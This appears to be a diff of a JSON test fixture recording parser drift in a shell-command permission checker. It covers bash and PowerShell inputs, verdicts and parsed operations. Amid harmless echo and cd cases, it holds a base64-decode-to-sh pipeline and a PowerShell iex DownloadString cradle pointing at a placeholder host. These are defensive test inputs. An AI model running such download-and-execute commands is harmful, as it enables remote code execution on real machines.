@@ -1,18 +1,42 @@
 [
   {
-    "id": "b06-base64-decode-exec",
+    "id": "b36-unclosed-quote",
     "dialect": "posix-bash",
+    "drift": {
+      "signature": {
+        "baseline": {
+          "normalized": "",
+          "trust": {
+            "executable": "",
+            "argv": [],
+            "hasMetasyntax": false,
+            "persistable": false
+          },
+          "persistableSingle": false
+        },
+        "current": {
+          "normalized": "echo \"unclosed",
+          "trust": {
+            "executable": "",
+            "argv": [],
+            "hasMetasyntax": false,
+            "persistable": false
+          },
+          "persistableSingle": false
+        }
+      }
+    }
+  },
+  {
+    "id": "p02-pipeline-foreach",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
-          "verdict": "deny",
-          "denyReason": "检测到危险的远程脚本执行\n\n这个命令会从网络下载脚本并直接运行。如果网址被劫持或下载内容被篡改，可能造成损失。\n\n建议：先用 curl … -o script.sh 下载到本地，查看内容后再执行。",
-          "validatorId": "pipe_to_shell",
-          "denyType": "strong",
+          "verdict": "ask",
           "segments": [
-            "echo aGVsbG8=",
-            "base64 -d",
-            "sh"
+            "$items",
+            "ForEach-Object { $_.Name }"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -26,96 +50,24 @@
             "requiresRiskAck": false,
             "outsideWorkDirRisk": false,
             "warnings": [],
-            "scannedPaths": [],
-            "violationCodes": [
-              "pipe_to_shell"
-            ],
-            "validatorId": "pipe_to_shell",
-            "denyType": "strong"
+            "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
-                "args": [
-                  "aGVsbG8="
-                ],
+                "verb": "$items",
+                "args": [],
                 "segmentIndex": 0
               },
               {
-                "verb": "base64",
+                "verb": "ForEach-Object",
                 "args": [
-                  "-d"
+                  "{",
+                  "$_.Name",
+                  "}"
                 ],
                 "segmentIndex": 1
-              },
-              {
-                "verb": "sh",
-                "args": [],
-                "segmentIndex": 2
-              }
-            ],
-            "connectors": [
-              "|",
-              "|"
-            ],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "deny",
-          "denyReason": "检测到危险的远程脚本执行\n\n这个命令会从网络下载脚本并直接运行。如果网址被劫持或下载内容被篡改，可能造成损失。\n\n建议：先用 curl … -o script.sh 下载到本地，查看内容后再执行。",
-          "validatorId": "pipe_to_shell",
-          "denyType": "strong",
-          "segments": [
-            "echo aGVsbG8=",
-            "base64 -d",
-            "sh"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": [],
-            "violationCodes": [
-              "pipe_to_shell"
-            ],
-            "validatorId": "pipe_to_shell",
-            "denyType": "strong"
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "aGVsbG8="
-                ],
-                "segmentIndex": 0
-              },
-              {
-                "verb": "base64",
-                "args": [
-                  "-d"
-                ],
-                "segmentIndex": 1
-              },
-              {
-                "verb": "sh",
-                "args": [],
-                "segmentIndex": 2
               }
             ],
             "connectors": [
@@ -126,34 +78,70 @@
             "analysisCompleteness": "complete",
             "unresolved": []
           }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "$items",
+            "ForEach-Object { $_.Name }"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "ForEach-Object",
+                "args": [
+                  "{ $_.Name }"
+                ],
+                "segmentIndex": 0
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "logical_expression:$items"
+            ]
+          }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
-              "args": [
-                "aGVsbG8="
-              ],
+              "verb": "$items",
+              "args": [],
               "segmentIndex": 0
             },
             {
-              "verb": "base64",
+              "verb": "ForEach-Object",
               "args": [
-                "-d"
+                "{",
+                "$_.Name",
+                "}"
               ],
               "segmentIndex": 1
-            },
-            {
-              "verb": "sh",
-              "args": [],
-              "segmentIndex": 2
             }
           ],
           "connectors": [
-            "|",
             "|"
           ],
           "paths": [],
@@ -162,26 +150,14 @@
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "ForEach-Object",
               "args": [
-                "aGVsbG8="
+                "{ $_.Name }"
               ],
               "segmentIndex": 0
-            },
-            {
-              "verb": "base64",
-              "args": [
-                "-d"
-              ],
-              "segmentIndex": 1
-            },
-            {
-              "verb": "sh",
-              "args": [],
-              "segmentIndex": 2
             }
           ],
           "connectors": [
@@ -189,173 +165,39 @@
           ],
           "paths": [],
           "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b12-semi-list",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo a",
-            "echo b"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "a"
-                ],
-                "segmentIndex": 0
-              },
-              {
-                "verb": "echo",
-                "args": [
-                  "b"
-                ],
-                "segmentIndex": 1
-              }
-            ],
-            "connectors": [
-              ";"
-            ],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo a",
-            "echo b"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "a"
-                ],
-                "segmentIndex": 0
-              },
-              {
-                "verb": "echo",
-                "args": [
-                  "b"
-                ],
-                "segmentIndex": 1
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "logical_expression:$items"
+          ]
         }
       },
-      "facts": {
+      "precheck": {
         "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "a"
-              ],
-              "segmentIndex": 0
-            },
-            {
-              "verb": "echo",
-              "args": [
-                "b"
-              ],
-              "segmentIndex": 1
-            }
-          ],
-          "connectors": [
-            ";"
-          ],
-          "paths": [],
-          "cwdChanges": [],
+          "ok": true,
+          "legacyAutoAllowEligible": false,
           "analysisCompleteness": "complete",
-          "unresolved": []
+          "persistable": false,
+          "hasMetasyntax": true
         },
         "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "a"
-              ],
-              "segmentIndex": 0
-            },
-            {
-              "verb": "echo",
-              "args": [
-                "b"
-              ],
-              "segmentIndex": 1
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
+          "ok": true,
+          "legacyAutoAllowEligible": false,
+          "analysisCompleteness": "partial",
+          "persistable": false,
+          "hasMetasyntax": true
         }
       }
     }
   },
   {
-    "id": "b13-dquote",
-    "dialect": "posix-bash",
+    "id": "p03-invoke-expression",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo \"hello world\""
+            "Invoke-Expression \"Get-Date\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -372,12 +214,12 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "Invoke-Expression",
                 "args": [
-                  "hello world"
+                  "Get-Date"
                 ],
                 "segmentIndex": 0
               }
@@ -392,7 +234,7 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo \"hello world\""
+            "Invoke-Expression \"Get-Date\""
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -409,12 +251,12 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "Invoke-Expression",
                 "args": [
-                  "\"hello world\""
+                  "\"Get-Date\""
                 ],
                 "segmentIndex": 0
               }
@@ -429,12 +271,12 @@
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Invoke-Expression",
               "args": [
-                "hello world"
+                "Get-Date"
               ],
               "segmentIndex": 0
             }
@@ -446,130 +288,12 @@
           "unresolved": []
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "Invoke-Expression",
               "args": [
-                "\"hello world\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b14-squote",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo 'single quoted'"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "single quoted"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo 'single quoted'"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "'single quoted'"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "single quoted"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "'single quoted'"
+                "\"Get-Date\""
               ],
               "segmentIndex": 0
             }
@@ -584,14 +308,14 @@
     }
   },
   {
-    "id": "b15-mixed-quote",
-    "dialect": "posix-bash",
+    "id": "p04-iex-cradle",
+    "dialect": "windows-powershell",
     "drift": {
       "analysis": {
         "baseline": {
           "verdict": "ask",
           "segments": [
-            "echo \"mixed 'quote' inside\""
+            "iex (New-Object Net.WebClient).DownloadString('http://x/p')"
           ],
           "pathVerdict": {
             "decision": "ask",
@@ -608,661 +332,20 @@
             "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "iex",
                 "args": [
-                  "mixed 'quote' inside"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"mixed 'quote' inside\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "\"mixed 'quote' inside\""
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "mixed 'quote' inside"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "\"mixed 'quote' inside\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b16-escaped-quote",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"with \\\"escape\\\" inside\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "with \"escape\" inside"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "echo \"with \\\"escape\\\" inside\""
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "\"with \\\"escape\\\" inside\""
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "with \"escape\" inside"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "\"with \\\"escape\\\" inside\""
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b18-assign-prefix",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "FOO=1 cmd --flag"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "FOO=1",
-                "args": [
-                  "cmd",
-                  "--flag"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "FOO=1 cmd --flag"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "cmd",
-                "args": [
-                  "--flag"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "FOO=1",
-              "args": [
-                "cmd",
-                "--flag"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "cmd",
-              "args": [
-                "--flag"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b19-assign-echo-var",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "VAR=value echo $VAR"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "VAR=value",
-                "args": [
-                  "echo",
-                  "$VAR"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "VAR=value echo $VAR"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [],
-            "warnings": [],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": false
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": false,
-            "outsideWorkDirRisk": false,
-            "warnings": [],
-            "scannedPaths": []
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "$VAR"
-                ],
-                "segmentIndex": 0
-              }
-            ],
-            "connectors": [],
-            "paths": [],
-            "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      },
-      "facts": {
-        "baseline": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "VAR=value",
-              "args": [
-                "echo",
-                "$VAR"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        },
-        "current": {
-          "dialect": "posix-bash",
-          "operations": [
-            {
-              "verb": "echo",
-              "args": [
-                "$VAR"
-              ],
-              "segmentIndex": 0
-            }
-          ],
-          "connectors": [],
-          "paths": [],
-          "cwdChanges": [],
-          "analysisCompleteness": "complete",
-          "unresolved": []
-        }
-      }
-    }
-  },
-  {
-    "id": "b21-cd-dotdot",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "cd ..",
-            "git status"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [
-              {
-                "code": "CD_OUTSIDE_<WORKDIR>",
-                "message": "cd 目标不在工作目录内：..",
-                "path": "..",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "cd 目标不在工作目录内：.."
-            ],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": true
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": false,
-            "warnings": [
-              "cd 目标不在工作目录内：.."
-            ],
-            "scannedPaths": [
-              ".."
-            ],
-            "violationCodes": [
-              "CD_OUTSIDE_<WORKDIR>"
-            ]
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "cd",
-                "args": [
-                  ".."
-                ],
-                "segmentIndex": 0
-              },
-              {
-                "verb": "git",
-                "args": [
-                  "status"
-                ],
-                "segmentIndex": 1
-              }
-            ],
-            "connectors": [
-              "&&"
-            ],
-            "paths": [],
-            "cwdChanges": [
-              ".."
-            ],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        },
-        "current": {
-          "verdict": "ask",
-          "segments": [
-            "cd ..",
-            "git status"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [
-              {
-                "code": "CD_OUTSIDE_<WORKDIR>",
-                "message": "cd 目标不在工作目录内：..",
-                "path": "..",
-                "severity": "warning"
-              },
-              {
-                "code": "PATH_OUTSIDE_<WORKDIR>",
-                "message": "命令包含工作目录外的路径：..",
-                "path": "..",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "cd 目标不在工作目录内：..",
-              "命令包含工作目录外的路径：.."
-            ],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": true
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": false,
-            "warnings": [
-              "cd 目标不在工作目录内：..",
-              "命令包含工作目录外的路径：.."
-            ],
-            "scannedPaths": [
-              "..",
-              ".."
-            ],
-            "violationCodes": [
-              "CD_OUTSIDE_<WORKDIR>",
-              "PATH_OUTSIDE_<WORKDIR>"
-            ]
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "cd",
-                "args": [
-                  ".."
-                ],
-                "segmentIndex": 0
-              },
-              {
-                "verb": "git",
-                "args": [
-                  "status"
-                ],
-                "segmentIndex": 1
-              }
-            ],
-            "connectors": [
-              "&&"
-            ],
-            "paths": [],
-            "cwdChanges": [
-              ".."
-            ],
-            "analysisCompleteness": "complete",
-            "unresolved": []
-          }
-        }
-      }
-    }
-  },
-  {
-    "id": "b22-redirect-abs",
-    "dialect": "posix-bash",
-    "drift": {
-      "analysis": {
-        "baseline": {
-          "verdict": "ask",
-          "segments": [
-            "echo x > /tmp/out.txt"
-          ],
-          "pathVerdict": {
-            "decision": "ask",
-            "violations": [
-              {
-                "code": "PATH_OUTSIDE_<WORKDIR>",
-                "message": "命令包含工作目录外的路径：/tmp/out.txt",
-                "path": "/tmp/out.txt",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令包含工作目录外的路径：/tmp/out.txt"
-            ],
-            "outsideWorkDirRisk": false,
-            "requiresRiskAck": true
-          },
-          "permissionDecision": "ask",
-          "shellSecurityHints": {
-            "requiresRiskAck": true,
-            "outsideWorkDirRisk": false,
-            "warnings": [
-              "命令包含工作目录外的路径：/tmp/out.txt"
-            ],
-            "scannedPaths": [
-              "/tmp/out.txt"
-            ],
-            "violationCodes": [
-              "PATH_OUTSIDE_<WORKDIR>"
-            ]
-          },
-          "facts": {
-            "dialect": "posix-bash",
-            "operations": [
-              {
-                "verb": "echo",
-                "args": [
-                  "x",
-                  ">",
-                  "/tmp/out.txt"
+                  "(New-Object",
+                  "Net.WebClient).DownloadString(http://x/p)"
                 ],
                 "segmentIndex": 0
               }
             ],
             "connectors": [],
             "paths": [
-              "/tmp/out.txt"
+              "Net.WebClient).DownloadString(http://x/p)"
             ],
             "cwdChanges": [],
             "analysisCompleteness": "partial",
@@ -1274,76 +357,62 @@
         "current": {
           "verdict": "ask",
           "segments": [
-            "echo x > /tmp/out.txt"
+            "iex (New-Object Net.WebClient).DownloadString('http://x/p')"
           ],
           "pathVerdict": {
             "decision": "ask",
-            "violations": [
-              {
-                "code": "PATH_OUTSIDE_<WORKDIR>",
-                "message": "命令包含工作目录外的路径：/tmp/out.txt",
-                "path": "/tmp/out.txt",
-                "severity": "warning"
-              }
-            ],
-            "warnings": [
-              "命令包含工作目录外的路径：/tmp/out.txt"
-            ],
+            "violations": [],
+            "warnings": [],
             "outsideWorkDirRisk": false,
-            "requiresRiskAck": true
+            "requiresRiskAck": false
           },
           "permissionDecision": "ask",
           "shellSecurityHints": {
-            "requiresRiskAck": true,
+            "requiresRiskAck": false,
             "outsideWorkDirRisk": false,
-            "warnings": [
-              "命令包含工作目录外的路径：/tmp/out.txt"
-            ],
-            "scannedPaths": [
-              "/tmp/out.txt"
-            ],
-            "violationCodes": [
-              "PATH_OUTSIDE_<WORKDIR>"
-            ]
+            "warnings": [],
+            "scannedPaths": []
           },
           "facts": {
-            "dialect": "posix-bash",
+            "dialect": "windows-powershell",
             "operations": [
               {
-                "verb": "echo",
+                "verb": "iex",
                 "args": [
-                  "x"
+                  "(New-Object Net.WebClient).DownloadString",
+                  "('http://x/p')"
                 ],
                 "segmentIndex": 0
               }
             ],
             "connectors": [],
             "paths": [
-              "/tmp/out.txt"
+              "('http://x/p')"
             ],
             "cwdChanges": [],
-            "analysisCompleteness": "complete",
-            "unresolved": []
+            "analysisCompleteness": "partial",
+            "unresolved": [
+              "argument_list:('http://x/p')"
+            ]
           }
         }
       },
       "facts": {
         "baseline": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "iex",
               "args": [
-                "x",
-                ">",
-                "/tmp/out.txt"
+                "(New-Object",
+                "Net.WebClient).DownloadString(http://x/p)"
               ],
               "segmentIndex": 0
             }
           ],
           "connectors": [],
           "paths": [
-            "/tmp/out.txt"
+            "Net.WebClient).DownloadString(http://x/p)"
           ],
           "cwdChanges": [],
           "analysisCompleteness": "partial",
@@ -1352,20 +421,303 @@
           ]
         },
         "current": {
-          "dialect": "posix-bash",
+          "dialect": "windows-powershell",
           "operations": [
             {
-              "verb": "echo",
+              "verb": "iex",
               "args": [
-                "x"
+                "(New-Object Net.WebClient).DownloadString",
+                "('http://x/p')"
               ],
               "segmentIndex": 0
             }
           ],
           "connectors": [],
           "paths": [
-            "/tmp/out.txt"
+            "('http://x/p')"
           ],
+          "cwdChanges": [],
+          "analysisCompleteness": "partial",
+          "unresolved": [
+            "argument_list:('http://x/p')"
+          ]
+        }
+      }
+    }
+  },
+  {
+    "id": "p07-here-string-outfile",
+    "dialect": "windows-powershell",
+    "drift": {
+      "analysis": {
+        "baseline": {
+          "verdict": "ask",
+          "segments": [
+            "@'\nhere\n'@",
+            "Out-File out.txt"
+          ],
+          "pathVerdict": {
+            "decision": "ask",
+            "violations": [],
+            "warnings": [],
+            "outsideWorkDirRisk": false,
+            "requiresRiskAck": false
+          },
+          "permissionDecision": "ask",
+          "shellSecurityHints": {
+            "requiresRiskAck": false,
+            "outsideWorkDirRisk": false,
+            "warnings": [],
+            "scannedPaths": []
+          },
+          "facts": {
+            "dialect": "windows-powershell",
+            "operations": [
+              {
+                "verb": "@;here;@",
+                "args": [],
+                "segmentIndex": 0
+              },
+              {
+                "verb": "Out-File",
+                "args": [
+                  "out.txt"
+                ],
+                "segmentIndex": 1
+              }
+            ],
+            "connectors": [
+              "|"
+            ],
+            "paths": [],
+            "cwdChanges": [],
+            "analysisCompleteness": "complete",
+            "unresolved": []
+          }
+        },
+        "current": {
+          "verdict": "ask",
+          "segments": [
+            "@'\nhere\n'@",
